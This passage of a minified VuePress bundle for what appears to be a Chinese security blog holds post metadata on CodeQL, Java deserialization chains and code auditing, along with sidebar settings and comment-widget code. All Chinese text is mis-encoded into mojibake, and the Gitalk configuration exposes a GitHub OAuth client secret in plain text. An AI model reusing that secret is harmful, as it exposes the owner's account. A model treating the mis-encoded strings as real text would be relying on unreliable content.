é¡¹ç®ï¼ä¸ï¼",filePath:"/home/runner/work/ischjm.github.io/ischjm.github.io/docs/02.å®å¨/200.éæåæ/2001.CodeQL/01. CodeQL - UBootç»ä¹ é¡¹ç®ï¼ä¸ï¼.md",wordsCount:"3.1k",readingTime:"12.3m",title:"CodeQL - UBootç»ä¹ é¡¹ç®ï¼ä¸ï¼",date:"2022-04-04T00:00:00.000Z",permalink:"/sec/sa/codeql/uboot2",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["éæåæ","CodeQL"],tags:["CodeQL"]},{name:" CodeQLä»å¥é¨å°æ¾å¼",filePath:"/home/runner/work/ischjm.github.io/ischjm.github.io/docs/02.å®å¨/200.éæåæ/2001.CodeQL/02. CodeQLä»å¥é¨å°æ¾å¼.md",wordsCount:"2.8k",readingTime:"11.3m",title:"CodeQLä»å¥é¨å°æ¾å¼",date:"2022-04-05T00:00:00.000Z",permalink:"/sec/sa/codeql/codeqlstep0to1",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["éæåæ","CodeQL"],tags:["CodeQL"]},{name:"ååºåååç-åå°",filePath:"/home/runner/work/ischjm.github.io/ischjm.github.io/docs/02.å®å¨/201.æ¼æ´åç/2010.ååºååæ¼æ´/00.ååºåååç-åå°.md",wordsCount:"1.8k",readingTime:"7.3m",title:"ååºååæ¼æ´åç - åå°",date:"2022-03-12T00:00:00.000Z",permalink:"/sec/vuln/deserialization/reflaction",author:{name:"p0jo",link:"https://wiki.pwddd.com"},titleTag:"åå",categories:["æ¼æ´åç","ååºååæ¼æ´"],tags:["ååºåå","æ¼æ´åç"]},{name:"URLDNSåæ",filePath:"/home/runner/work/ischjm.github.io/ischjm.github.io/docs/02.å®å¨/201.æ¼æ´åç/2010.ååºååæ¼æ´/01.URLDNSåæ.md",wordsCount:"2.2k",readingTime:"9.5m",title:"URLDNSé¾åæ",date:"2022-03-12T12:00:00.000Z",permalink:"/sec/vuln/deserialization/urldns",author:{name:"p0jo",link:"https://wiki.pwddd.com"},titleTag:"åå",categories:["æ¼æ´åç","ååºååæ¼æ´"],tags:["ååºåå","URLDNS","ysoserial"]},{name:"CC1åæ",filePath:"/home/runner/work/ischjm.github.io/ischjm.github.io/docs/02.å®å¨/201.æ¼æ´åç/2010.ååºååæ¼æ´/02.CC1åæ.md",wordsCount:"5.1k",readingTime:"22.4m",title:"CC1åæ",date:"2022-03-13T00:00:00.000Z",permalink:"/sec/vuln/deserialization/cc1",author:{name:"p0jo",link:"https://wiki.pwddd.com"},titleTag:"åå",categories:["æ¼æ´åç","ååºååæ¼æ´"],tags:["ååºåå","CC","ysoserial"]},{name:"CC6åæ",filePath:"/home/runner/work/ischjm.github.io/ischjm.github.io/docs/02.å®å¨/201.æ¼æ´åç/2010.ååºååæ¼æ´/03.CC6åæ.md",wordsCount:"1.1k",readingTime:"5.1m",title:"CC6åæ",date:"2022-03-20T00:00:00.000Z",permalink:"/sec/vuln/deserialization/cc6",author:{name:"p0jo",link:"https://wiki.pwddd.com"},titleTag:"åå",categories:["æ¼æ´åç","ååºååæ¼æ´"],tags:["ååºåå","CC","ysoserial"]},{name:"ååºåååç-ååºåå",filePath:"/home/runner/work/ischjm.github.io/ischjm.github.io/docs/02.å®å¨/201.æ¼æ´åç/2010.ååºååæ¼æ´/04.ååºåååç-ååºåå.md",wordsCount:"1.7k",readingTime:"7.5m",title:"ååºååæ¼æ´åç - ååºåå",date:"2022-05-25T00:00:00.000Z",permalink:"/sec/vuln/deserialization/serialization",author:{name:"p0jo",link:"https://wiki.pwddd.com"},titleTag:"åå",categories:["æ¼æ´åç","ååºååæ¼æ´"],tags:["ååºåå","æ¼æ´åç"]},{name:"Pythonå­ç¬¦ä¸²çé£äºäº",filePath:"/home/runner/work/ischjm.github.io/ischjm.github.io/docs/02.å®å¨/202.å®å¨å¼å/2020.Python/00.Pythonå­ç¬¦ä¸²çé£äºäº.md",wordsCount:"2.1k",readingTime:"8.4m",title:"Pythonå­ç¬¦ä¸²çé£äºäº",date:"2022-03-22T00:00:00.000Z",permalink:"/sec/dev/python/pystring",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["å®å¨å¼å","Python"],tags:["Python"]},{name:"Pythonåºåçé£äºäº",filePath:"/home/runner/work/ischjm.github.io/ischjm.github.io/docs/02.å®å¨/202.å®å¨å¼å/2020.Python/01.Pythonåºåçé£äºäº.md",wordsCount:"4.5k",readingTime:"20.3m",title:"Pythonåºåçé£äºäº",date:"2022-03-22T12:00:00.000Z",permalink:"/sec/dev/python/sequence",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["å®å¨å¼å","Python"],tags:["Python"]},{name:"Pythonæµç¨æ§å¶çé£äºäº",filePath:"/home/runner/work/ischjm.github.io/ischjm.github.io/docs/02.å®å¨/202.å®å¨å¼å/2020.Python/02.Pythonæµç¨æ§å¶çé£äºäº.md",wordsCount:"1.6k",readingTime:"6.4m",title:"Pythonæµç¨æ§å¶çé£äºäº",date:"2022-03-22T20:00:00.000Z",permalink:"/sec/dev/python/process",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["å®å¨å¼å","Python"],tags:["Python"]},{name:"Pythonå½æ°çå°ç§å¯",filePath:"/home/runner/work/ischjm.github.io/ischjm.github.io/docs/02.å®å¨/202.å®å¨å¼å/2020.Python/03.Pythonå½æ°çå°ç§å¯.md",wordsCount:"2.4k",readingTime:"9.1m",title:"Pythonå½æ°çå°ç§å¯",date:"2022-03-23T20:00:00.000Z",permalink:"/sec/dev/python/func",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["å®å¨å¼å","Python"],tags:["Python"]},{name:"Pythoné¢åå¯¹è±¡çé£äºäº",filePath:"/home/runner/work/ischjm.github.io/ischjm.github.io/docs/02.å®å¨/202.å®å¨å¼å/2020.Python/04.Pythoné¢åå¯¹è±¡çé£äºäº.md",wordsCount:"3.9k",readingTime:"15.9m",title:"Pythoné¢åå¯¹è±¡çé£äºäº",date:"2022-03-25T20:00:00.000Z",permalink:"/sec/dev/python/oop",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["å®å¨å¼å","Python"],tags:["Python"]},{name:"Pythonå¼å¸¸å¤ççé£äºäº",filePath:"/home/runner/work/ischjm.github.io/ischjm.github.io/docs/02.å®å¨/202.å®å¨å¼å/2020.Python/05.Pythonå¼å¸¸å¤ççé£äºäº.md",wordsCount:"1.6k",readingTime:"6.3m",title:"Pythonå¼å¸¸å¤ççé£äºäº",date:"2022-03-26T20:00:00.000Z",permalink:"/sec/dev/python/exception",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["å®å¨å¼å","Python"],tags:["Python"]},{name:"Pythonæä»¶æä½çé£äºäº",filePath:"/home/runner/work/ischjm.github.io/ischjm.github.io/docs/02.å®å¨/202.å®å¨å¼å/2020.Python/06.Pythonæä»¶æä½çé£äºäº.md",wordsCount:"3.5k",readingTime:"14.5m",title:"Pythonæä»¶æä½çé£äºäº",date:"2022-03-26T23:00:00.000Z",permalink:"/sec/dev/python/file",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["å®å¨å¼å","Python"],tags:["Python"]},{name:"Pythonæ¨¡ååçé£äºäº",filePath:"/home/runner/work/ischjm.github.io/ischjm.github.io/docs/02.å®å¨/202.å®å¨å¼å/2020.Python/07.Pythonæ¨¡ååçé£äºäº.md",wordsCount:"3k",readingTime:"11.3m",title:"Pythonæ¨¡ååçé£äºäº",date:"2022-03-27T22:00:00.000Z",permalink:"/sec/dev/python/module",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["å®å¨å¼å","Python"],tags:["Python"]},{name:"Pythonå¤çº¿ç¨çé£äºäº",filePath:"/home/runner/work/ischjm.github.io/ischjm.github.io/docs/02.å®å¨/202.å®å¨å¼å/2020.Python/08.Pythonå¤çº¿ç¨çé£äºäº.md",wordsCount:"7.8k",readingTime:"31.7m",title:"Pythonå¤çº¿ç¨çé£äºäº",date:"2022-03-28T09:00:00.000Z",permalink:"/sec/dev/python/thread",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["å®å¨å¼å","Python"],tags:["Python"]},{name:"Goè¯­è¨åºç¡è¯­æ³",filePath:"/home/runner/work/ischjm.github.io/ischjm.github.io/docs/02.å®å¨/202.å®å¨å¼å/2021.Go/00.Goè¯­è¨åºç¡è¯­æ³.md",wordsCount:"5.5k",readingTime:"23m",title:"Goè¯­è¨åºç¡è¯­æ³",date:"2022-04-07T21:00:00.000Z",permalink:"/sec/dev/go/basicgrammar",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["å®å¨å¼å","Go"],tags:["Go"]},{name:"jaræåä¸ºapp",filePath:"/home/runner/work/ischjm.github.io/ischjm.github.io/docs/02.å®å¨/203.å¥æ·«å·§æ/2030.å°å·¥å·/00.jaræåä¸ºapp.md",wordsCount:"1.2k",readingTime:"5.1m",title:"Jaræåä¸ºAPP",date:"2022-04-20T21:00:00.000Z",permalink:"/sec/skill/jar2app",author:{name:"NineRiverSec",link:"https://github.com/NineRiverSec"},categories:["å¥æ·«å·§æ","å°å·¥å·"],tags:["Tools"]},{name:"picocli",filePath:"/home/runner/work/ischjm.github.io/ischjm.github.io/docs/02.å®å¨/203.å¥æ·«å·§æ/2030.å°å·¥å·/01.picocli.md",wordsCount:"10.3k",readingTime:"44.6m",title:"Java Picocli Quick Start",date:"2022-04-26T03:00:00.000Z",permalink:"/sec/skill/picocli-quick-start",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["å¥æ·«å·§æ","å°å·¥å·"],tags:["Java","CLI","Tools"]},{name:"Javaä»£ç å®¡è®¡CheckList",filePath:"/home/runner/work/ischjm.github.io/ischjm.github.io/docs/02.å®å¨/204.ä»£ç å®¡è®¡/00.Javaä»£ç å®¡è®¡CheckList.md",wordsCount:"9.1k",readingTime:"33m",title:"Javaä»£ç å®¡è®¡CheckList",date:"2022-07-26T15:00:00.000Z",permalink:"/sec/codereview/javachecklist",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["ä»£ç å®¡è®¡"],tags:["Java","ä»£ç å®¡è®¡"]},{name:"å¤©æ°çç­å¼ä¸ªç©ºè°å§",filePath:"/home/runner/work/ischjm.github.io/ischjm.github.io/docs/03.çæ´»/300.å¶ä»/01.å¤©æ°çç­å¼ä¸ªç©ºè°å§.md",wordsCount:79,readingTime:"1",title:"å¤©æ°çç­ï¼å°ç«ç©ºè°å·²å¼æ¾ï¼",date:"2022-06-23T00:00:00.000Z",permalink:"/life/other/airconditioning",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["å¼å","åç«¯","åç«¯åºç¡"],sidebar:!1,article:!1,tags:["HTML","CSS"]},{name:"emoji",filePath:"/home/runner/work/ischjm.github.io/ischjm.github.io/docs/04.æ´å¤/400.åå®¢æ­å»º/00.emoji.md",wordsCount:904,readingTime:"5.6m",title:"Emojiè¡¨æéå",date:"2000-01-01T00:00:00.000Z",permalink:"/more/blog/emoji",categories:["æ´å¤","åå®¢æ­å»º"],tags:[null]},{name:"ç§å¯æç« æµè¯",filePath:"/home/runner/work/ischjm.github.io/ischjm.github.io/docs/04.æ´å¤/400.åå®¢æ­å»º/01.ç§å¯æç« æµè¯.md",wordsCount:210,readingTime:"1",title:"ç§å¯æç« æµè¯",date:"2022-05-14T08:14:22.000Z",permalink:"/more/blog/privatepage",categories:["æ´å¤","åå®¢æ­å»º"],tags:[null]},{name:"å³äº",filePath:"/home/runner/work/ischjm.github.io/ischjm.github.io/docs/05.å³äº/01.å³äº.md",wordsCount:792,readingTime:"3.9m",title:"AboutME",date:"2019-12-25T14:27:01.000Z",permalink:"/about",sidebar:!1,article:!1}],mdFileCountType:"archives",totalWords:"archives",moutedEvent:".tags-wrapper",indexIteration:2500,pageIteration:2500},bodyBgImg:"https://wiki-1251603812.cos.ap-shanghai.myqcloud.com/images/bg.jpeg",bodyBgImgOpacity:1,contentBgStyle:1,sidebar:{"/00.ç®å½é¡µ/":[{title:"å¯¼èªæ ",collapsable:!0,children:[["00.å¯¼èªæ /01.å¼å.md","å¼å","/dev/"],["00.å¯¼èªæ /02.å®å¨.md","å®å¨","/sec/"],["00.å¯¼èªæ /03.çæ´».md","çæ´»","/life/"],["00.å¯¼èªæ /04.æ´å¤.md","æ´å¤","/more/"]]},{title:"å¼å",collapsable:!0,children:[["01.å¼å/00.åç«¯.md","åç«¯","/dev/web/"],["01.å¼å/01.åç«¯.md","åç«¯","/dev/java/"],["01.å¼å/02.è®¡ç®æºåºç¡.md","è®¡ç®æºåºç¡","/dev/basic/"]]},{title:"å®å¨",collapsable:!0,children:[["02.å®å¨/00.éæåæ.md","éæåæ","/sec/sa/"],["02.å®å¨/01.æ¼æ´åç.md","æ¼æ´åç","/sec/vuln/"],["02.å®å¨/02.å®å¨å¼å.md","å®å¨å¼å","/sec/dev/"],["02.å®å¨/03.å¥æ·«å·§æ.md","å¥æ·«å·§æ","/sec/skill/"]]},{title:"æ´å¤",collapsable:!0,children:[["04.æ´å¤/00.åå®¢æ­å»º.md","åå®¢æ­å»º","/more/blog/"]]}],catalogue:{"å¼å":"/dev/","å®å¨":"/sec/","çæ´»":"/life/","æ´å¤":"/more/","åç«¯":"/dev/web/","åç«¯":"/dev/java/","è®¡ç®æºåºç¡":"/dev/basic/","éæåæ":"/sec/sa/","æ¼æ´åç":"/sec/vuln/","å®å¨å¼å":"/sec/dev/","å¥æ·«å·§æ":"/sec/skill/","åå®¢æ­å»º":"/more/blog/"},"/01.å¼å/":[{title:"åç«¯",collapsable:!0,children:[{title:"åç«¯åºç¡",collapsable:!0,children:[["100.åç«¯/1000.åç«¯åºç¡/00. HTML&CSSåºç¡.md","HTML&CSSåºç¡","/dev/web/basis/htmlandcss"]]}]},{title:"åç«¯",collapsable:!0,children:[{title:"å¾®æå¡æ ¸å¿",collapsable:!0,children:[["101.åç«¯/1011.å¾®æå¡æ ¸å¿/00.Spring5.md","Spring5","/dev/java/core/spring5"],["101.åç«¯/1011.å¾®æå¡æ ¸å¿/01.SpringMVC.md","SpringMVC","/dev/java/core/springmvc"],["101.åç«¯/1011.å¾®æå¡æ ¸å¿/02.Mybatis.md","MyBatis","/dev/java/core/mybatis"],["101.åç«¯/1011.å¾®æå¡æ ¸å¿/03.MyBatisPlus.md","MyBatis-Plus","/dev/java/core/mybatisplus"],["101.åç«¯/1011.å¾®æå¡æ ¸å¿/04.SSM.md","SSM","/dev/java/core/ssm"],["101.åç«¯/1011.å¾®æå¡æ ¸å¿/05.Springboot.md","Springboot1 åºç¡ç¯","/dev/java/core/springbootbase"]]},{title:"å¾®æå¡çæ",collapsable:!0,children:[["101.åç«¯/1012.å¾®æå¡çæ/00.Docker.md","Docker","/dev/java/eco/docker"],["101.åç«¯/1012.å¾®æå¡çæ/01.SpringSecurity.md","Spring Security","/dev/java/eco/springsecurity"],["101.åç«¯/1012.å¾®æå¡çæ/02.Shiro.md","Shiro","/dev/java/eco/shiro"]]},{title:"é¡¹ç®å®æ",collapsable:!0,children:[["101.åç«¯/1013.é¡¹ç®å®æ/00.å°ç­¹ç½.md","å°ç­¹ç½","/dev/java/project/cf"],["101.åç«¯/1013.é¡¹ç®å®æ/01.ä»£ç çæ®µ.md","ä»£ç çæ®µéå","/dev/java/project/code"]]}]},{title:"è®¡ç®æºåºç¡",collapsable:!0,children:[{title:"æ°æ®ç»æä¸ç®æ³",collapsable:!0,children:[["102.è®¡ç®æºåºç¡/1020.æ°æ®ç»æä¸ç®æ³/00.æ¦è¿°.md","ãæ°æ®ç»æãæ¦è¿°","/dev/basic/ds/introduction"],["102.è®¡ç®æºåºç¡/1020.æ°æ®ç»æä¸ç®æ³/01.çº¿æ§è¡¨.md","ãæ°æ®ç»æãçº¿æ§è¡¨","/dev/basic/ds/list"]]},{title:"è®¡ç®æºç½ç»",collapsable:!0,children:[["102.è®¡ç®æºåºç¡/1021.è®¡ç®æºç½ç»/00.æ¦è¿°.md","ãè®¡ç®æºç½ç»ãæ¦è¿°","/dev/basic/network/introduction"],["102.è®¡ç®æºåºç¡/1021.è®¡ç®æºç½ç»/01.ç©çå±.md","ãè®¡ç®æºç½ç»ãç©çå±","/dev/basic/network/physicallayer"]]}]}],"/02.å®å¨/":[{title:"éæåæ",collapsable:!0,children:[{title:"åäº¬å¤§å­¦è¯¾ç¨ç¬è®°",collapsable:!0,children:[["200.éæåæ/2000.åäº¬å¤§å­¦è¯¾ç¨ç¬è®°/00.Introduction.md","SA - Introduction","/sec/sa/nju/introduction"],["200.éæåæ/2000.åäº¬å¤§å­¦è¯¾ç¨ç¬è®°/01.IR.md","SA - IR","/sec/sa/nju/ir"],["200.éæåæ/2000.åäº¬å¤§å­¦è¯¾ç¨ç¬è®°/02.DFA-Applications.md","SA - DFA-Applications","/sec/sa/nju/dfaapplications"],["200.éæåæ/2000.åäº¬å¤§å­¦è¯¾ç¨ç¬è®°/03.DFA-Foundations.md","SA - DFA-Foundations","/sec/sa/nju/dfafoundations"]]},{title:"CodeQL",collapsable:!0,children:[["200.éæåæ/2001.CodeQL/00. CodeQL - UBootç»ä¹ é¡¹ç®ï¼ä¸ï¼.md","CodeQL - UBootç»ä¹ é¡¹ç®ï¼ä¸ï¼","/sec/sa/codeql/uboot1"],["200.éæåæ/2001.CodeQL/01. CodeQL - UBootç»ä¹ é¡¹ç®ï¼ä¸ï¼.md","CodeQL - UBootç»ä¹ é¡¹ç®ï¼ä¸ï¼","/sec/sa/codeql/uboot2"],["200.éæåæ/2001.CodeQL/02. CodeQLä»å¥é¨å°æ¾å¼.md","CodeQLä»å¥é¨å°æ¾å¼","/sec/sa/codeql/codeqlstep0to1"]]}]},{title:"æ¼æ´åç",collapsable:!0,children:[{title:"ååºååæ¼æ´",collapsable:!0,children:[["201.æ¼æ´åç/2010.ååºååæ¼æ´/00.ååºåååç-åå°.md","ååºååæ¼æ´åç - åå°","/sec/vuln/deserialization/reflaction","åå"],["201.æ¼æ´åç/2010.ååºååæ¼æ´/01.URLDNSåæ.md","URLDNSé¾åæ","/sec/vuln/deserialization/urldns","åå"],["201.æ¼æ´åç/2010.ååºååæ¼æ´/02.CC1åæ.md","CC1åæ","/sec/vuln/deserialization/cc1","åå"],["201.æ¼æ´åç/2010.ååºååæ¼æ´/03.CC6åæ.md","CC6åæ","/sec/vuln/deserialization/cc6","åå"],["201.æ¼æ´åç/2010.ååºååæ¼æ´/04.ååºåååç-ååºåå.md","ååºååæ¼æ´åç - ååºåå","/sec/vuln/deserialization/serialization","åå"]]}]},{title:"å®å¨å¼å",collapsable:!0,children:[{title:"Python",collapsable:!0,children:[["202.å®å¨å¼å/2020.Python/00.Pythonå­ç¬¦ä¸²çé£äºäº.md","Pythonå­ç¬¦ä¸²çé£äºäº","/sec/dev/python/pystring"],["202.å®å¨å¼å/2020.Python/01.Pythonåºåçé£äºäº.md","Pythonåºåçé£äºäº","/sec/dev/python/sequence"],["202.å®å¨å¼å/2020.Python/02.Pythonæµç¨æ§å¶çé£äºäº.md","Pythonæµç¨æ§å¶çé£äºäº","/sec/dev/python/process"],["202.å®å¨å¼å/2020.Python/03.Pythonå½æ°çå°ç§å¯.md","Pythonå½æ°çå°ç§å¯","/sec/dev/python/func"],["202.å®å¨å¼å/2020.Python/04.Pythoné¢åå¯¹è±¡çé£äºäº.md","Pythoné¢åå¯¹è±¡çé£äºäº","/sec/dev/python/oop"],["202.å®å¨å¼å/2020.Python/05.Pythonå¼å¸¸å¤ççé£äºäº.md","Pythonå¼å¸¸å¤ççé£äºäº","/sec/dev/python/exception"],["202.å®å¨å¼å/2020.Python/06.Pythonæä»¶æä½çé£äºäº.md","Pythonæä»¶æä½çé£äºäº","/sec/dev/python/file"],["202.å®å¨å¼å/2020.Python/07.Pythonæ¨¡ååçé£äºäº.md","Pythonæ¨¡ååçé£äºäº","/sec/dev/python/module"],["202.å®å¨å¼å/2020.Python/08.Pythonå¤çº¿ç¨çé£äºäº.md","Pythonå¤çº¿ç¨çé£äºäº","/sec/dev/python/thread"]]},{title:"Go",collapsable:!0,children:[["202.å®å¨å¼å/2021.Go/00.Goè¯­è¨åºç¡è¯­æ³.md","Goè¯­è¨åºç¡è¯­æ³","/sec/dev/go/basicgrammar"]]}]},{title:"å¥æ·«å·§æ",collapsable:!0,children:[{title:"å°å·¥å·",collapsable:!0,children:[["203.å¥æ·«å·§æ/2030.å°å·¥å·/00.jaræåä¸ºapp.md","Jaræåä¸ºAPP","/sec/skill/jar2app"],["203.å¥æ·«å·§æ/2030.å°å·¥å·/01.picocli.md","Java Picocli Quick Start","/sec/skill/picocli-quick-start"]]}]},{title:"ä»£ç å®¡è®¡",collapsable:!0,children:[["204.ä»£ç å®¡è®¡/00.Javaä»£ç å®¡è®¡CheckList.md","Javaä»£ç å®¡è®¡CheckList","/sec/codereview/javachecklist"]]}],"/03.çæ´»/":[{title:"å¶ä»",collapsable:!0,children:[["300.å¶ä»/01.å¤©æ°çç­å¼ä¸ªç©ºè°å§.md","å¤©æ°çç­ï¼å°ç«ç©ºè°å·²å¼æ¾ï¼","/life/other/airconditioning"]]}],"/04.æ´å¤/":[{title:"åå®¢æ­å»º",collapsable:!0,children:[["400.åå®¢æ­å»º/00.emoji.md","Emojiè¡¨æéå","/more/blog/emoji"],["400.åå®¢æ­å»º/01.ç§å¯æç« æµè¯.md","ç§å¯æç« æµè¯","/more/blog/privatepage"]]}],"/05.å³äº/":[["01.å³äº.md","AboutME","/about"]]},author:{name:"p0jo",link:"https://github.com/p0josec"},blogger:{avatar:"https://wiki-1251603812.cos.ap-shanghai.myqcloud.com/images/avatar.jpg",name:"p0jo",slogan:"æ¬²åä¸çï¼ååèªå·±ã"},social:{icons:[{iconClass:"icon-youjian",title:"åé®ä»¶",link:"mailto:p0josec@gmail.com"},{iconClass:"icon-github",title:"GitHub",link:"https://github.com/p0josec"},{iconClass:"icon-erji",title:"å¬é³ä¹",link:"https://music.163.com/#/playlist?id=755597173"}]},footer:{createYear:2022,copyrightInfo:'Vuepress-theme-Vdoing | <a href="https://github.com/xugaoyi/vuepress-theme-vdoing/blob/master/LICENSE" target="_blank">MIT License</a>'},htmlModules:{homeSidebarB:'<div style="padding: 0.95rem">\n    <br>\n    <p style="\n      color: var(--textColor);\n      opacity: 0.9;\n      font-size: 20px;\n      font-weight: bold;\n      margin: 0 0 8px 0;\n    ">å¬ä¼å·</p>\n    <img src="https://wiki-1251603812.cos.ap-shanghai.myqcloud.com/images/wechat.png" style="width:100%"/>\n    <p>\n    <br>\n    å¬ä¼å·é´æ­æ§æ´æ°ä¸­ï¼æè°¢å³æ³¨ï½\n    </p>\n    </div>'}},locales:{"/":{lang:"zh-CN",title:"ä¸æ ¡çç©å·é´",description:"åèè¨ä¸å¦èµ·èè¡ãjs,java,vue,Spring,html5,Node,git,github,CodeQLç­ææ¯æç« ã",path:"/"}}};t(261);let wl;function kl(n){var e=document.querySelector(n);e&&e.parentNode.removeChild(e)}function _l(n,e=".articleInfo-wrap > .articleInfo > .info"){var t=0;let r=setInterval(()=>{t++;const a=document.querySelector(e);a?function(n,e){return n.parentNode==e}(n,a)||(a.appendChild(n),clearInterval(r)):t>10&&clearInterval(r)},1e3)}var Sl=t(98),jl=t(99),Cl=t(12);var Il={computed:{$filterPosts(){return this.$site.pages.filter(n=>{const{frontmatter:{pageComponent:e,article:t,home:r}}=n;return!(e||!1===t||!0===r)})},$sortPosts(){return(n=this.$filterPosts).sort((n,e)=>{const t=n.frontmatter.sticky,r=e.frontmatter.sticky;return t&&r?t==r?Object(Cl.a)(n,e):t-r:t&&!r?-1:!t&&r?1:Object(Cl.a)(n,e)}),n;var n},$sortPostsByDate(){return(n=this.$filterPosts).sort((n,e)=>Object(Cl.a)(n,e)),n;var n},$groupPosts(){return function(n){const e={},t={};for(let r=0,a=n.length;r<a;r++){const{frontmatter:{categories:a,tags:i}}=n[r];"array"===Object(Cl.n)(a)&&a.forEach(t=>{t&&(e[t]||(e[t]=[]),e[t].push(n[r]))}),"array"===Object(Cl.n)(i)&&i.forEach(e=>{e&&(t[e]||(t[e]=[]),t[e].push(n[r]))})}return{categories:e,tags:t}}(this.$sortPosts)},$categoriesAndTags(){return function(n){const e=[],t=[];for(let t in n.categories)e.push({key:t,length:n.categories[t].length});for(let e in n.tags)t.push({key:e,length:n.tags[e].length});return{categories:e,tags:t}}(this.$groupPosts)}}};Gt.component(Sl.default),Gt.component(jl.default);function Tl(n){return n.toString().padStart(2,"0")}t(249);Gt.component("Card",()=>Promise.all([t.e(0),t.e(3)]).then(t.bind(null,344))),Gt.component("IndexBigImg",()=>Promise.all([t.e(0),t.e(4)]).then(t.bind(null,345))),Gt.component("Login",()=>Promise.resolve().then(t.bind(null,261))),Gt.component("WebInfo",()=>Promise.all([t.e(0),t.e(5)]).then(t.bind(null,341))),Gt.component("Badge",()=>Promise.all([t.e(0),t.e(6)]).then(t.bind(null,408))),Gt.component("CodeBlock",()=>Promise.resolve().then(t.bind(null,98))),Gt.component("CodeGroup",()=>Promise.resolve().then(t.bind(null,99)));t(250);var El={name:"ReadingProgress",data:()=>({readingTop:0,readingHeight:1,progressStyle:null,transform:void 0,running:!1}),watch:{$readingShow(){this.progressStyle=this.getProgressStyle(),this.$readingShow&&window.addEventListener("scroll",this.base)}},mounted(){this.transform=this.getTransform(),this.progressStyle=this.getProgressStyle(),this.$readingShow&&window.addEventListener("scroll",this.base)},beforeDestroy(){this.$readingShow&&window.removeEventListener("scroll",this.base)},methods:{base(){this.running||(this.running=!0,requestAnimationFrame(this.getReadingBase))},getReadingBase(){this.readingHeight=this.getReadingHeight()-this.getScreenHeight(),this.readingTop=this.getReadingTop(),this.progressStyle=this.getProgressStyle(),this.running=!1},getReadingHeight:()=>Math.max(document.body.scrollHeight,document.body.offsetHeight,0),getScreenHeight:()=>Math.max(window.innerHeight,document.documentElement.clientHeight,0),getReadingTop:()=>Math.max(window.pageYOffset,document.documentElement.scrollTop,0),getTransform(){const n=document.createElement("div");return["transform","-webkit-transform","-moz-transform","-o-transform","-ms-transform"].find(e=>e in n.style)||void 0},getProgressStyle(){const n=this.readingTop/this.readingHeight;switch(this.$readingShow){case"top":case"bottom":return this.transform?`${this.transform}: scaleX(${n})`:`width: ${100*n}%`;case"left":case"right":return this.transform?`${this.transform}: scaleY(${n})`:`height: ${100*n}%`;default:return null}}}},Al=(t(251),Object(bl.a)(El,(function(){var n=this._self._c;return n("ClientOnly",[this.$readingShow?n("div",{staticClass:"reading-progress",class:this.$readingShow},[n("div",{staticClass:"progress",style:this.progressStyle})]):this._e()])}),[],!1,null,"3640397f",null).exports),zl=(t(252),t(97)),ql=t.n(zl),Ml=t(27);let Pl,Ll;var Rl;"valine"===(Rl="gitalk")?t.e(73).then(t.t.bind(null,337,7)).then(n=>Ll=n.default):"gitalk"===Rl&&Promise.all([t.e(0),t.e(72)]).then(t.t.bind(null,338,7)).then(()=>t.e(71).then(t.t.bind(null,339,7))).then(n=>Pl=n.default);function Ol(n,e){const t={};return Reflect.ownKeys(n).forEach(r=>{if("string"==typeof n[r])try{t[r]=ql.a.render(n[r],e)}catch(e){console.warn(`Comment config option error at key named "${r}"`),console.warn("More info: "+e.message),t[r]=n[r]}else t[r]=n[r]}),t}console.log(`How to use "gitalk" in ${Ml.name}@v${Ml.version}:`,Ml.homepage);const Dl={gitalk:{render(n,e){const t=document.createElement("div");t.id=e;document.querySelector("main.page").appendChild(t);new Pl(Ol({clientID:"ce8d24a63bb0c5701685",clientSecret:"e6b33c9d3e857f675b3bb34a1c491b323325b49d",repo:"WikiTalk",owner:"p0josec",admin:["p0josec"],distractionFreeMode:!0,pagerDirection:"last",id:"<%- (frontmatter.permalink || frontmatter.to.path).slice(-16) %>",title:"ãè¯è®ºã<%- frontmatter.title %>",labels:["Gitalk","Comment"],body:"é¡µé¢ï¼<%- window.location.origin + (frontmatter.to.path || window.location.pathname) %>"},{frontmatter:n})).render(e)},clear(n){const e=document.querySelector("#"+n);return e&&e.remove(),!0}},valine:{render(n,e){const t=document.createElement("div");t.id=e;document.querySelector("main.page").appendChild(t),new Ll({...Ol({clientID:"ce8d24a63bb0c5701685",clientSecret:"e6b33c9d3e857f675b3bb34a1c491b323325b49d",repo:"WikiTalk",owner:"p0josec",admin:["p0josec"],distractionFreeMode:!0,pagerDirection:"last",id:"<%- (frontmatter.permalink || frontmatter.to.path).slice(-16) %>",title:"ãè¯è®ºã<%- frontmatter.title %>",labels:["Gitalk","Comment"],body:"é¡µé¢ï¼<%- window.location.origin + (frontmatter.to.path || window.location.pathname) %>"},{frontmatter:n}),el:"#"+e})},clear(n){const e=document.querySelector("#"+n);return e&&e.remove(),!0}}},Bl="vuepress-plugin-comment";let Ul=null;function Fl(n){return Dl.gitalk.clear(Bl)}function Nl(n){return!1!==n.comment&&!1!==n.comments}function Hl(n){clearTimeout(Ul);if(document.querySelector("main.page"))return Dl.gitalk.render(n,Bl);Ul=setTimeout(()=>Hl(n),200)}var $l={mounted(){Ul=setTimeout(()=>{const n={to:{},from:{},...this.$frontmatter};Fl()&&Nl(n)&&Hl(n)},1e3),this.$router.afterEach((n,e)=>{if(n&&e&&n.path===e.path)return;const 